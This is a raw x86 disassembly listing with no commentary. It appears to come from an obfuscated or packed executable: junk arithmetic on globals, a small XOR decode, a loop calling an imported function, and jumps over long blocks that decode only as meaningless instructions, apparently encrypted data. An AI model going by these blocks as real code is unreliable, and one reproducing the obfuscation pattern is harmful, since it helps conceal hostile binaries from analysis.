  4040f4:	sbb    eax,DWORD PTR ds:0x433773
  4040fa:	mov    eax,0x8a3a
  4040ff:	sub    DWORD PTR ds:0x4336ab,0x44c4
  404109:	xor    ax,WORD PTR [ecx+0x20]
  40410d:	sub    ecx,0x3d49
  404113:	mov    ecx,0x3b00
  404118:	xor    DWORD PTR ds:0x433647,0x649a
  404122:	add    ax,cx
  404125:	movzx  eax,ax
  404128:	mov    DWORD PTR [ebp-0xc],eax
  40412b:	mov    ecx,DWORD PTR ds:0x43375b
  404131:	and    DWORD PTR ds:0x433727,ecx
  404137:	mov    BYTE PTR [ebp-0x1],0x7f
  40413b:	sub    ecx,0x46a5
  404141:	lea    eax,[ebp-0x1]
  404144:	mov    DWORD PTR [ebp-0x10],eax
  404147:	adc    DWORD PTR ds:0x43363f,ecx
  40414d:	mov    al,BYTE PTR [ebp-0x1]
  404150:	movzx  ecx,WORD PTR ds:0x433643
  404157:	or     ecx,DWORD PTR ds:0x433697
  40415d:	mov    DWORD PTR ds:0x433643,ecx
  404163:	mov    ecx,DWORD PTR [ebp-0x10]
  404166:	xor    al,0x45
  404168:	sub    DWORD PTR ds:0x4336f3,0x7f5e
  404172:	sub    al,0x39
  404174:	mov    BYTE PTR [ecx],al
  404176:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40417d:	mov    DWORD PTR [ebp-0x10],0xf89c8534
  404184:	add    DWORD PTR ds:0x43375b,ebx
  40418a:	mov    eax,DWORD PTR [ebp-0x8]
  40418d:	sbb    ecx,0x3751
  404193:	mov    ecx,0x7510853
  404198:	jmp    0x40436a
  40419d:	mov    ds,ebp
  40419f:	inc    eax
  4041a0:	add    DWORD PTR [ebx-0x6f],0x1318dd55
  4041a7:	and    edx,esp
  4041a9:	inc    ebx
  4041aa:	loope  0x40418b
  4041ac:	sbb    DWORD PTR [eax-0x548383dc],ebp
  4041b2:	jg     0x404230
  4041b4:	jl     0x4041bb
  4041b6:	ret    0x3f42
  4041b9:	clc    
  4041ba:	scas   al,BYTE PTR es:[edi]
  4041bb:	mov    edi,0x6a2c07ee
  4041c0:	out    dx,eax
  4041c1:	std    
  4041c2:	std    
  4041c3:	call   0xf075299b
  4041c8:	ret    0xac24
  4041cb:	pushf  
  4041cc:	popa   
  4041cd:	clc    
  4041ce:	std    
  4041cf:	(bad)  
  4041d0:	ret    
  4041d1:	mov    esp,0xf30b1c7b
  4041d6:	aas    
  4041d7:	fwait
  4041d8:	outs   dx,DWORD PTR ds:[esi]
  4041d9:	sub    esp,DWORD PTR [ebp-0x120e8483]
  4041df:	jo     0x404254
  4041e1:	lock arpl bx,bx
  4041e4:	cmp    BYTE PTR ds:0x35a96bdf,bh
  4041ea:	sbb    ecx,ecx
  4041ec:	xchg   BYTE PTR [edi+eiz*4],bh
  4041ef:	outs   dx,DWORD PTR ds:[esi]
  4041f0:	jnp    0x40418a
  4041f2:	xchg   ecx,eax
  4041f3:	fidiv  WORD PTR [esi]
  4041f5:	pushf  
  4041f6:	sbb    eax,0x93d20c36
  4041fb:	push   esi
  4041fc:	add    al,BYTE PTR [esi+0x12ee41d9]
  404202:	das    
  404203:	bnd jo 0x4041cf
  404206:	inc    BYTE PTR [eax]
  404208:	mov    ch,0xcc
  40420a:	scas   al,BYTE PTR es:[edi]
  40420b:	sub    BYTE PTR [ecx-0x1f],bh
  40420e:	mov    esi,0xba5878d3
  404213:	add    al,0x75
  404215:	inc    esi
  404216:	adc    eax,0x19b1d546
  40421b:	inc    ebp
  40421c:	and    eax,0x769ea3c3
  404221:	inc    ebx
  404222:	mov    eax,ds:0x80d6fb09
  404227:	sub    al,0x1
  404229:	mov    edi,0x69a754c5
  40422e:	jmp    0xdb344e8f
  404233:	adc    BYTE PTR [eax+0x56],ch
  404236:	cmp    eax,0xd67f6ced
  40423b:	enter  0xba60,0x65
  40423f:	pushf  
  404240:	mov    bl,0x68
  404242:	cld    
  404243:	xor    dl,BYTE PTR [ecx]
  404245:	pop    edi
  404246:	push   ebp
  404247:	sahf   
  404248:	xchg   BYTE PTR [ecx],bh
  40424a:	jecxz  0x4041f2
  40424c:	aaa    
  40424d:	pop    ebp
  40424e:	das    
  40424f:	js     0x4042bc
  404251:	fsubrp st(6),st
  404253:	repnz pusha 
  404255:	or     ebp,DWORD PTR [esi]
  404257:	jns    0x404264
  404259:	out    dx,al
  40425a:	inc    ecx
  40425b:	test   al,0x9a
  40425d:	inc    esi
  40425e:	sub    edx,DWORD PTR [edi]
  404260:	in     eax,dx
  404261:	aaa    
  404262:	push   eax
  404263:	xchg   esp,eax
  404264:	jmp    0xa17e63cb
  404269:	js     0x404221
  40426b:	and    DWORD PTR [esi-0x295ecfe0],ecx
  404271:	mov    ebx,0x68bb1b8f
  404276:	out    dx,eax
  404277:	dec    ebp
  404278:	test   eax,0xf3298070
  40427d:	out    0xf2,al
  40427f:	imul   ecx,edi,0x13
  404282:	or     al,BYTE PTR [esp+eiz*4-0x30149c51]
  404289:	mov    ebx,0xeed3c4f8
  40428e:	push   0x4f393e71
  404293:	cli    
  404294:	cld    
  404295:	mov    DWORD PTR [eax+0x5],ecx
  404298:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404299:	jmp    0x81cfefa
  40429e:	mov    bl,BYTE PTR [eax+0x59]
  4042a1:	mov    ch,0x33
  4042a3:	mov    ebp,0xbb0defd5
  4042a8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4042a9:	es and ecx,ebx
  4042ac:	xor    eax,0x6d5668d7
  4042b1:	je     0x404253
  4042b3:	mov    dl,0xd6
  4042b5:	retf   0x46b
  4042b8:	adc    bh,BYTE PTR [ebx]
  4042ba:	xchg   esp,eax
  4042bb:	clc    
  4042bc:	xor    ah,BYTE PTR [edi+eiz*4+0x61394eed]
  4042c3:	jnp    0x4042ee
  4042c5:	fidiv  DWORD PTR [ecx-0x3794cb0d]
  4042cb:	into   
  4042cc:	and    eax,0xb3422933
  4042d1:	fstp   DWORD PTR [edx-0x7dc928a4]
  4042d7:	jnp    0x404266
  4042d9:	data16 jbe 0x404342
  4042dc:	inc    ebp
  4042dd:	pop    ds
  4042de:	mov    esi,0x5a8c1284
  4042e3:	add    DWORD PTR [eax+0x6666e2dc],ebx
  4042e9:	inc    ebx
  4042ea:	push   ebp
  4042ec:	fwait
  4042ed:	int    0x8e
  4042ef:	jae    0x4042ec
  4042f1:	dec    edi
  4042f2:	gs xchg esi,eax
  4042f4:	aas    
  4042f5:	adc    BYTE PTR [ecx*4+0x69d108f2],dl
  4042fc:	ficom  WORD PTR [edi]
  4042fe:	outs   dx,DWORD PTR ds:[esi]
  4042ff:	int3   
  404300:	adc    esp,edx
  404302:	mov    eax,0x6dedcde9
  404307:	dec    ecx
  404308:	mov    eax,0x43a84f14
  40430d:	inc    ebx
  40430e:	shr    BYTE PTR [eax],1
  404310:	adc    ebx,edi
  404312:	mov    al,ds:0x4b6bbc03
  404317:	jle    0x4042e5
  404319:	int3   
  40431a:	push   edi
  40431b:	and    ah,bl
  40431d:	into   
  40431e:	sbb    edx,eax
  404320:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404321:	jle    0x4042c7
  404323:	int    0x95
  404325:	jecxz  0x4042ca
  404327:	rcr    DWORD PTR [ebp-0x26],0xd2
  40432b:	jae    0x4042f4
  40432d:	retf   0xfba3
  404330:	outs   dx,BYTE PTR ds:[esi]
  404331:	mov    eax,ds:0x2aa55635
  404336:	retf   0x2e88
  404339:	outs   dx,BYTE PTR ds:[esi]
  40433a:	and    dh,BYTE PTR [edi-0x7f]
  40433d:	call   0x67b8:0xc65d21d2
  404344:	fadd   st,st(0)
  404346:	mov    eax,ds:0xc574be51
  40434b:	sbb    eax,0xed69630
  404350:	sub    al,0x3b
  404352:	push   0x1
  404354:	xor    bh,BYTE PTR [ecx]
  404356:	mov    ds:0xc9172a65,al
  40435b:	neg    DWORD PTR [eax+0x2ea7b168]
  404361:	mov    al,0x33
  404363:	in     al,dx
  404364:	jae    0x404330
  404366:	call   0x56f202c9
  40436b:	or     DWORD PTR ds:0x43371f,0x4643
  404375:	xor    eax,ecx
  404377:	add    DWORD PTR ds:0x43372f,0x1b4e
  404381:	mov    esi,0x32729a
  404386:	or     DWORD PTR ds:0x43372f,0x4336ef
  404390:	jmp    0x404562
  404395:	sub    ecx,DWORD PTR [edx]
  404397:	mov    esi,DWORD PTR [ebx-0x6dcc424b]
  40439d:	mov    cl,0x88
  40439f:	cmp    BYTE PTR [ecx],bh
  4043a1:	mov    ch,0xbf
  4043a3:	pop    ebx
  4043a4:	or     eax,0x7c7c26e7
  4043a9:	stos   DWORD PTR es:[edi],eax
  4043aa:	jg     0x404428
  4043ac:	jl     0x4043cf
  4043ae:	shr    BYTE PTR [edi-0xb43897f],cl
  4043b4:	sub    BYTE PTR [edx-0x4dd31b7d],cl
  4043ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4043bb:	pop    ebx
  4043bc:	xor    al,0x26
  4043be:	aad    0x1e
  4043c0:	aam    0x65
  4043c2:	sub    BYTE PTR [ebp*2-0x13356ee6],dl
  4043c9:	js     0x40434d
  4043cb:	cmc    
  4043cc:	imul   ebp,DWORD PTR cs:[eax+0x5],0xffffffeb
  4043d1:	iret   
  4043d2:	and    al,BYTE PTR [edx+0xd26c044]
  4043d8:	mov    al,0xfb
  4043da:	mov    ebx,0xf55c52fd
  4043df:	inc    edi
  4043e0:	pop    esp
  4043e1:	cld    
  4043e2:	xchg   DWORD PTR [edx+esi*4-0x43e90eaa],ebx
  4043e9:	adc    bh,BYTE PTR [eax-0x6c]
  4043ec:	pop    ebp
  4043ed:	xchg   ebx,eax
  4043ee:	cwde   
  4043ef:	and    ecx,edi
  4043f1:	jb     0x40441e
  4043f3:	jmp    0x40437b
  4043f5:	dec    ebx
  4043f6:	test   al,0x57
  4043f8:	ror    DWORD PTR [ecx+0x5f1f2caa],cl
  4043fe:	loope  0x404462
  404400:	jmp    0xca1d:0x1a03fb6d
  404407:	dec    esi
  404408:	stos   BYTE PTR es:[edi],al
  404409:	je     0x404419
  40440b:	adc    BYTE PTR [edi+0x5336c955],0x11
  404412:	or     eax,0x50856fb9
  404417:	xchg   edx,eax
  404418:	addr16 mov al,0x27
  40441b:	cs mov ecx,0x2b6bd8e1
  404421:	push   eax
  404422:	enter  0x1d50,0x9
  404426:	push   es
  404427:	daa    
  404428:	mov    BYTE PTR [eax],cl
  40442a:	pushf  
  40442b:	cwde   
  40442c:	scas   eax,DWORD PTR es:[edi]
  40442d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40442e:	sub    eax,0xb4309e14
  404433:	or     BYTE PTR [esi+0x79],bh
  404436:	xchg   edi,eax
  404437:	lods   al,BYTE PTR ds:[esi]
  404438:	cdq    
  404439:	je     0x4043cf
  40443b:	pusha  
  40443c:	gs jnp 0x40447f
  40443f:	xchg   esp,eax
  404440:	adc    ecx,DWORD PTR [ebx-0x35]
  404443:	hlt    
  404444:	iret   
  404445:	inc    ecx
  404446:	lahf   
  404447:	pop    ss
  404448:	mov    ecx,DWORD PTR [edx+0x5]
  40444b:	icebp  
  40444c:	sub    DWORD PTR [edi-0xd],esi
  40444f:	push   edi
  404450:	dec    esp
  404451:	sub    ebp,ebx
  404453:	sbb    cl,BYTE PTR [eax-0x14]
  404456:	shl    BYTE PTR [edi+0x77],1
  404459:	sub    WORD PTR [ebx+0x174c62ad],0x98e3
  404462:	rcr    DWORD PTR ds:0xc858c30d,1
  404468:	dec    edi
  404469:	inc    edx
  40446a:	xchg   edx,ecx
  40446c:	adc    ch,BYTE PTR es:[ebp+0x27]
  404470:	enter  0x490a,0x0
  404474:	push   0xffffff8d
  404476:	fdivr  QWORD PTR [esi-0x71]
  404479:	ret    0xa81d
  40447c:	test   eax,0xc6c8b2a8
  404481:	pop    ebp
  404482:	in     al,0xc6
  404484:	test   eax,0xccf6157e
  404489:	mov    edx,DWORD PTR [edx-0xbf94d75]
  40448f:	aam    0x91
  404491:	sbb    eax,0xf4237411
  404496:	sbb    eax,0xb102de31
  40449b:	jnp    0x4044db
  40449d:	mov    edx,0xf89ae066
  4044a2:	and    DWORD PTR [ecx+0xed67e4a],ecx
  4044a8:	mov    WORD PTR [edx-0x2d28d588],cs
  4044ae:	xchg   ebx,eax
  4044af:	aam    0x96
  4044b1:	adc    bh,ch
  4044b3:	mov    ah,0x1c
  4044b5:	sbb    dh,BYTE PTR [edx+0x1f]
  4044b8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4044b9:	mov    ebx,DWORD PTR [ebp+ebp*2-0x80]
  4044bd:	nop
  4044be:	in     eax,0x2e
  4044c0:	cmc    
  4044c1:	outs   dx,DWORD PTR ds:[esi]
  4044c2:	mov    edx,0xbe635de5
  4044c7:	mov    eax,ds:0x3c8d1c7b
  4044cc:	icebp  
  4044cd:	loop   0x404509
  4044cf:	jbe    0x40453d
  4044d1:	retf   0x6ea8
  4044d4:	repnz dec ebp
  4044d6:	and    eax,0x701ae0ac
  4044db:	push   edx
  4044dc:	mov    edi,0x4df4695b
  4044e1:	dec    esp
  4044e2:	xor    ecx,eax
  4044e4:	or     DWORD PTR [esi-0x66],ebp
  4044e7:	ja     0x4044cf
  4044e9:	cli    
  4044ea:	jg     0x404486
  4044ec:	dec    esi
  4044ed:	ja     0x4044ac
  4044ef:	adc    eax,0xe4466749
  4044f4:	and    al,0xcb
  4044f6:	arpl   si,bx
  4044f8:	adc    DWORD PTR [ebx-0x7352724],edi
  4044fe:	and    ebp,0xffffffaa
  404501:	(bad)  
  404503:	dec    eax
  404504:	aaa    
  404505:	pusha  
  404506:	gs mov dh,0xb9
  404509:	es int 0xb0
  40450c:	dec    ebx
  40450d:	inc    ebp
  40450e:	lods   al,BYTE PTR ds:[esi]
  40450f:	cld    
  404510:	shl    DWORD PTR [edi+0x4b4b8e45],1
  404516:	mov    edi,0x4b1d8d4f
  40451b:	(bad)  
  40451c:	mov    edx,0x2d37fa1a
  404521:	test   BYTE PTR [ecx+ebx*8],0x17
  404525:	and    ebp,0x60
  404528:	adc    dl,BYTE PTR [edi+0x5b7a30ff]
  40452e:	and    al,al
  404530:	in     eax,dx
  404531:	adc    eax,0x9e07cb7c
  404536:	adc    BYTE PTR [ecx],dh
  404538:	mov    bh,0x23
  40453a:	xchg   ebx,eax
  40453b:	sub    ebx,DWORD PTR [esi+0x5b6e279c]
  404541:	jmp    0xf23c:0x5f02c84
  404548:	lea    eax,[ebx+0x42]
  40454b:	push   0xffffffb2
  40454d:	shr    BYTE PTR ds:[ebp-0x15],0xd9
  404552:	mov    edx,0x1437d637
  404557:	sub    DWORD PTR [esi-0xd8f2776],eax
  40455d:	data16 out 0x87,al
  404560:	ficomp DWORD PTR [esi-0x111639fd]
  404566:	add    DWORD PTR [eax],eax
  404568:	add    bh,al
  40456a:	add    eax,0x4336a7
  40456f:	bound  eax,QWORD PTR [bx+si]
  404572:	add    BYTE PTR [edx+0x5c7ff55],cl
  404578:	push   ebx
  404579:	ss inc ebx
  40457b:	add    BYTE PTR [esi],al
  40457d:	sbb    al,0x0
  40457f:	add    cl,ch
  404581:	int    0x1
  404583:	add    BYTE PTR [eax],al
  404585:	rol    DWORD PTR [edx+edi*1],cl
  404588:	push   ss
  404589:	aad    0xd2
  40458b:	ror    ebp,cl
  40458d:	mov    eax,0x74c2aa9d
  404592:	cmp    eax,0x2012a795
  404597:	jl     0x404615
  404599:	stos   DWORD PTR es:[edi],eax
  40459a:	jg     0x404618
  40459c:	jl     0x4045ec
  40459e:	adc    esp,DWORD PTR ds:0x73906d03
  4045a4:	jmp    0xbb02:0xf4b7ba2c
  4045ab:	stos   DWORD PTR es:[edi],eax
  4045ac:	(bad)  
  4045ad:	mov    esp,0x1f5ee6d
  4045b2:	mov    ch,0x49
  4045b4:	loope  0x4045fe
  4045b6:	arpl   WORD PTR [edi+eax*8+0x32],sp
  4045ba:	pop    ebp
  4045bb:	fstp   QWORD PTR [edx-0x63]
  4045be:	mov    bl,0x37
  4045c0:	jge    0x4045eb
  4045c2:	mov    esp,DWORD PTR ds:0x17b2c997
  4045c8:	test   DWORD PTR [ebx-0x54efa57f],ecx
  4045ce:	pop    ecx
  4045cf:	retf   0x3dd9
  4045d2:	rcr    DWORD PTR [esi+ebx*1],cl
  4045d5:	jle    0x404633
  4045d7:	xor    ah,BYTE PTR [ebx]
  4045d9:	jmp    0x404636
  4045db:	mov    eax,0x33ce8660
  4045e0:	js     0x4045d7
  4045e2:	mov    dh,0x3c
  4045e4:	and    DWORD PTR [eax+0x648b34c6],edx
  4045ea:	cmp    al,0xbf
  4045ec:	mov    dh,0xcf
  4045ee:	mov    ecx,0xc58bb21a
  4045f3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4045f4:	xchg   edx,eax
  4045f5:	jge    0x404631
  4045f7:	xchg   edi,eax
  4045f8:	addr16 pop ss
  4045fa:	ror    BYTE PTR [ebp+ecx*1-0x5a],cl
  4045fe:	jo     0x404629
  404600:	repz call FWORD PTR [edi]
  404603:	or     eax,0x1be8e877
  404608:	pop    ss
  404609:	add    edi,DWORD PTR [edx-0x69]
  40460c:	lds    esp,FWORD PTR [ebp+0x65db7bef]
  404612:	pop    edx
  404613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404614:	test   dl,dl
  404616:	sti    
  404617:	sar    DWORD PTR [ecx],0x15
  40461a:	call   0xf98cb123
  40461f:	iret   
  404620:	xchg   ecx,eax
  404621:	ss nop
  404623:	dec    esi
  404624:	push   0xc277f504
  404629:	int3   
  40462a:	jo     0x404614
  40462c:	leave  
  40462d:	inc    esi
  40462e:	adc    BYTE PTR [ebx+ebx*8+0x7],bh
  404632:	retf   
  404633:	and    al,0xe1
  404635:	and    eax,0x2fcc524b
  40463a:	dec    ecx
  40463b:	pop    esi
  40463c:	stos   DWORD PTR es:[edi],eax
  40463d:	xor    eax,DWORD PTR [ebx-0x2f]
  404640:	fwait
  404641:	push   0x3f
  404643:	add    DWORD PTR [ebx-0x1e],0xffffffec
  404647:	je     0x4046aa
  404649:	fimul  WORD PTR [ebx]
  40464b:	adc    DWORD PTR [ecx],ebx
  40464d:	(bad)  
  40464e:	fimul  WORD PTR [eax+0xcb1add5]
  404654:	jo     0x4046c8
  404656:	fs mov dl,0xd
  404659:	add    al,0xa5
  40465b:	mov    eax,0x3b6941bf
  404660:	push   ss
  404661:	mov    esp,0x880d1891
  404666:	sub    edx,DWORD PTR [esi+0x401fee75]
  40466c:	push   ds
  40466d:	das    
  40466e:	jp     0x4046a3
  404670:	outs   dx,DWORD PTR ds:[esi]
  404671:	jl     0x40465d
  404673:	push   esp
  404674:	sar    edi,0x5b
  404677:	adc    eax,0x530378c
  40467c:	(bad)  
  40467e:	call   0x2fb70479
  404683:	imul   esi,DWORD PTR [edi-0x3700b44f],0x8a2177e5
  40468d:	fcmovu st,st(2)
  40468f:	cmp    edx,DWORD PTR ds:0x6c70c56b
  404695:	cmp    al,0x11
  404697:	in     eax,0x7c
  404699:	xchg   edi,eax
  40469a:	mov    cl,0x6
  40469c:	inc    edx
  40469d:	adc    esi,DWORD PTR [edi]
  40469f:	jmp    0x40466d
  4046a1:	jl     0x4046e3
  4046a3:	mov    gs,esi
  4046a5:	ret    
  4046a6:	cmp    eax,0xe5c0a028
  4046ab:	cmp    al,0x2c
  4046ad:	clc    
  4046ae:	(bad)  
  4046af:	std    
  4046b0:	push   0xa3fb0d42
  4046b5:	pop    edi
  4046b6:	sti    
  4046b7:	pop    ecx
  4046b8:	fcmovne st,st(2)
  4046ba:	add    DWORD PTR [edi],ecx
  4046bc:	sar    DWORD PTR [ebx-0x4d],cl
  4046bf:	js     0x404688
  4046c1:	and    bh,BYTE PTR [ecx+0x5d8d5cc]
  4046c7:	gs dec esp
  4046c9:	imul   eax,esi,0x7a
  4046cc:	mov    al,0xa6
  4046ce:	push   ss
  4046cf:	xchg   ecx,eax
  4046d0:	out    0x7b,al
  4046d2:	ret    
  4046d3:	jno    0x404725
  4046d5:	fcomp  DWORD PTR [ecx+edi*8-0x685d04f4]
  4046dc:	cmp    edx,DWORD PTR [eax]
  4046de:	btc    eax,ecx
  4046e1:	cli    
  4046e2:	sar    DWORD PTR [esi+eax*8],1
  4046e5:	xchg   BYTE PTR [ebx+0x5b],dh
  4046e8:	inc    ebp
  4046e9:	out    0xc7,eax
  4046eb:	std    
  4046ec:	sub    esp,0x17
  4046ef:	arpl   WORD PTR [ebp+0xb],si
  4046f2:	cdq    
  4046f3:	lods   al,BYTE PTR ds:[esi]
  4046f4:	ins    DWORD PTR es:[edi],dx
  4046f5:	iret   
  4046f6:	outs   dx,BYTE PTR ds:[esi]
  4046f7:	sar    BYTE PTR [edx],0x2d
  4046fa:	adc    DWORD PTR [edx+eax*1],edi
  4046fd:	sbb    DWORD PTR [edi],edi
  4046ff:	pop    ecx
  404700:	xor    edi,DWORD PTR [ebx+eiz*2-0x22]
  404704:	pop    ecx
  404705:	jnp    0x4046e7
  404707:	fild   DWORD PTR ds:0xc2a33ae0
  40470d:	cs cld 
  40470f:	inc    edi
  404710:	adc    BYTE PTR [ecx],0xa5
  404713:	loope  0x4046c2
  404715:	adc    ah,BYTE PTR [edx+0x29]
  404718:	push   eax
  404719:	in     al,dx
  40471a:	push   edx
  40471b:	add    bh,cl
  40471d:	stc    
  40471e:	inc    esi
  40471f:	sbb    ch,bh
  404721:	mov    bh,0xbd
  404723:	(bad)  
  404724:	push   edi
  404725:	mov    dh,0xa6
  404727:	jbe    0x404738
  404729:	les    edx,FWORD PTR [edx]
  40472b:	popa   
  40472c:	jp     0x40476d
  40472e:	xchg   ecx,eax
  40472f:	xchg   edi,eax
  404730:	clc    
  404731:	call   0xe843:0x3ffd4e77
  404738:	jne    0x404705
  40473a:	(bad)  
  40473b:	sbb    ecx,esi
  40473d:	outs   dx,BYTE PTR ds:[esi]
  40473e:	xor    al,0x9c
  404740:	mov    bl,0x69
  404742:	dec    eax
  404743:	idiv   dl
  404745:	out    0xb6,eax
  404747:	mov    BYTE PTR ds:0x336a6940,0xa4
  40474e:	aaa    
  40474f:	push   esp
  404750:	cmp    BYTE PTR [ecx-0x78],dl
  404753:	push   esp
  404754:	add    eax,0x5c740a8
  404759:	dec    edi
  40475a:	ss inc ebx
  40475c:	add    bl,ah
  40475e:	or     eax,0xf8830000
  404763:	inc    eax
  404764:	jb     0x404569
  40476a:	sub    eax,DWORD PTR ds:0x433757
  404770:	mov    edx,DWORD PTR [ebp-0x8]
  404773:	mov    DWORD PTR ds:0x43363f,0x14
  40477d:	cmp    DWORD PTR ds:0x43363f,0x0
  404784:	je     0x4047dd
  40478a:	cmp    DWORD PTR ds:0x43363f,0xa
  404791:	jne    0x4047ab
  404797:	push   DWORD PTR [ebp-0x24]
  40479a:	push   DWORD PTR [ebp-0xc]
  40479d:	push   0x42f8
  4047a2:	push   DWORD PTR [ebp-0x24]
  4047a5:	call   DWORD PTR ds:0x4120bc
  4047ab:	cmp    DWORD PTR ds:0x43363f,0xb
  4047b2:	jne    0x4047c3
  4047b8:	mov    eax,ds:0x43363f
  4047bd:	dec    eax
  4047be:	mov    ds:0x43363f,eax
  4047c3:	mov    eax,ds:0x43363f
  4047c8:	dec    eax
  4047c9:	mov    ds:0x43363f,eax
  4047ce:	jmp    0x40477d
  4047d3:	or     DWORD PTR ds:0x4336e3,0x7ef0
  4047dd:	mov    eax,DWORD PTR [ebp-0xc]
  4047e0:	xor    edx,ecx
  4047e2:	xor    DWORD PTR ds:0x4336d7,0x43376f
  4047ec:	add    edx,esi
  4047ee:	cmp    edx,eax
  4047f0:	mov    DWORD PTR ds:0x4336db,0x5bbb
  4047fa:	je     0x404a4f
  404800:	sbb    DWORD PTR ds:0x4336e7,edi
  404806:	push   ebx
  404807:	or     DWORD PTR ds:0x4336f3,ebx
  40480d:	jmp    0x4049df
  404812:	and    eax,0xfd09dbf4
  404817:	sbb    eax,0xea31f0f5
  40481c:	push   edx
  40481d:	loope  0x4047ec
  40481f:	mov    cl,BYTE PTR cs:[ecx+0x49]
  404823:	and    edi,DWORD PTR [esp+edi*2-0x55]
  404827:	jg     0x4048a5
  404829:	jl     0x404883
  40482b:	cmp    esp,DWORD PTR [ebx+0x23646b8b]
  404831:	cmpps  xmm5,xmm3,0xdb
  404835:	aam    0x16
  404837:	push   es
  404838:	clc    
  404839:	aas    
  40483a:	add    eax,DWORD PTR [edx*4+0x42cdb5fd]
  404841:	and    ah,BYTE PTR [edx+eiz*4-0x1a7918c2]
  404848:	cmc    
  404849:	fstp   QWORD PTR [edi*8-0x77a47cb7]
  404850:	(bad)  
  404851:	jmp    0x2678147f
  404856:	jnp    0x40488b
  404858:	pop    edx
  404859:	inc    ecx
  40485a:	adc    ch,BYTE PTR [edx+0x4c]
  40485d:	nop
  40485e:	popa   
  40485f:	mov    bh,0x35
  404861:	push   ebx
  404862:	pop    edx
  404863:	aas    
  404864:	sbb    DWORD PTR [edi+0x63c04de8],edx
  40486a:	cs xor ch,ch
  40486d:	add    eax,0x7611d7e5
  404872:	sar    BYTE PTR [eax+0x1914f294],1
  404878:	push   ds
  404879:	jb     0x4048cf
  40487b:	iret   
  40487c:	add    edi,DWORD PTR [edi+0x70]
  40487f:	cmp    al,0x33
  404881:	or     dh,BYTE PTR [edi]
  404883:	lds    edx,FWORD PTR [ebx-0x7f]
  404886:	call   0x5d3d30e1
  40488b:	dec    edx
  40488c:	xchg   edx,eax
  40488d:	ja     0x404884
  40488f:	retf   
  404890:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404891:	mov    al,0xfb
  404893:	shl    DWORD PTR [edx-0x2d13757e],0x47
  40489a:	aas    
  40489b:	pop    ebx
  40489c:	xchg   ebx,eax
  40489d:	and    DWORD PTR [ebp-0x2295324e],edx
  4048a3:	xor    eax,0xe638b4b8
  4048a8:	mov    WORD PTR [ebx],fs
  4048aa:	out    0xd3,eax
  4048ac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4048ad:	loope  0x4048d6
  4048af:	mov    dh,0xd9
  4048b1:	xor    BYTE PTR [esi-0x34],ch
  4048b4:	xchg   BYTE PTR [eax],al
  4048b6:	push   ss
  4048b7:	mov    ebx,gs
  4048b9:	in     al,0x5c
  4048bb:	inc    ecx
  4048bc:	imul   ecx,DWORD PTR [edi],0xffffffe5
  4048bf:	cmp    al,0x2b
  4048c1:	stc    
  4048c2:	adc    BYTE PTR [esi],bh
  4048c4:	(bad)  
  4048c5:	pusha  
  4048c6:	fidivr DWORD PTR ds:0x83f13e7f
  4048cc:	jmp    0x40493e
  4048ce:	jmp    0x4048cf
  4048d0:	pop    ebp
  4048d1:	pop    edi
  4048d2:	pop    edx
  4048d3:	push   edi
  4048d4:	ins    BYTE PTR es:[edi],dx
  4048d5:	or     edx,DWORD PTR [edi-0x6e]
  4048d8:	adc    ah,cl
  4048da:	lahf   
  4048db:	cmp    al,0x51
  4048dd:	and    esi,DWORD PTR [edi+0x6dbc57b4]
  4048e3:	push   ebp
  4048e4:	jmp    0x4048bf
  4048e6:	add    DWORD PTR [ebx+0x6],edi
  4048e9:	stos   BYTE PTR es:[edi],al
  4048ea:	sbb    al,0x81
  4048ec:	or     eax,0xa5ccfb
  4048f1:	sub    dh,BYTE PTR ds:0xabc91cee
  4048f7:	daa    
  4048f8:	mov    ch,BYTE PTR [ebp+0x78]
  4048fb:	dec    ecx
  4048fc:	push   ebp
  4048fd:	fiadd  DWORD PTR [ecx+0x1551d87a]
  404903:	mov    bh,0xff
  404905:	fs jecxz 0x4048e0
  404908:	mov    ds:0x9ba0a2cd,al
  40490d:	sahf   
  40490e:	or     BYTE PTR [edx-0x1f],cl
  404911:	mov    BYTE PTR [esi-0x56f3f2fe],ah
  404917:	into   
  404918:	push   ds
  404919:	xchg   ebp,eax
  40491a:	cmp    DWORD PTR [edx],0x36
  40491d:	sbb    ebp,DWORD PTR [esi+0x36]
  404920:	lock add esi,DWORD PTR [ecx]
  404923:	add    edx,edi
  404925:	fiadd  WORD PTR [eax+0x52]
  404928:	jns    0x404977
  40492a:	mov    cl,0x91
  40492c:	push   ebp
  40492d:	test   al,0xa3
  40492f:	mov    DWORD PTR [esp+ebx*2-0x3],ecx
  404933:	jg     0x404947
  404935:	(bad)  
  404937:	pop    ebx
  404938:	in     al,0x77
  40493a:	mov    al,0xdf
  40493c:	imul   ebx,DWORD PTR [eax-0x30],0xca124beb
  404943:	xor    ah,cl
  404945:	adc    edi,edi
  404947:	mov    DWORD PTR [ebx+0x77],ecx
  40494a:	in     eax,0x5d
  40494c:	or     BYTE PTR [edx+esi*1-0x28d19f6a],cl
  404953:	cmp    edx,DWORD PTR [esi+0x72b98044]
  404959:	pop    esp
  40495a:	adc    al,0x4a
  40495c:	je     0x404924
  40495e:	loope  0x4049c7
  404960:	xchg   edx,eax
  404961:	mov    eax,esi
  404963:	mov    bh,0xf7
  404965:	xor    eax,0x1db0e0a9
  40496a:	pop    edx
  40496b:	sub    dl,cl
  40496d:	dec    edi
  40496e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40496f:	inc    esi
  404970:	dec    eax
  404971:	ins    BYTE PTR es:[edi],dx
  404972:	mov    dl,BYTE PTR [edx]
  404974:	or     BYTE PTR [eax],dl
  404976:	loope  0x40497f
  404978:	and    bl,BYTE PTR [esi+ebp*8-0x3b96dc6d]
  40497f:	push   esi
  404980:	mov    edi,DWORD PTR [edx]
  404982:	pop    ebp
  404983:	aad    0x27
  404985:	jno    0x40497e
  404987:	popa   
  404988:	pop    eax
  404989:	outs   dx,BYTE PTR ds:[esi]
  40498a:	push   ebx
  40498b:	popf   
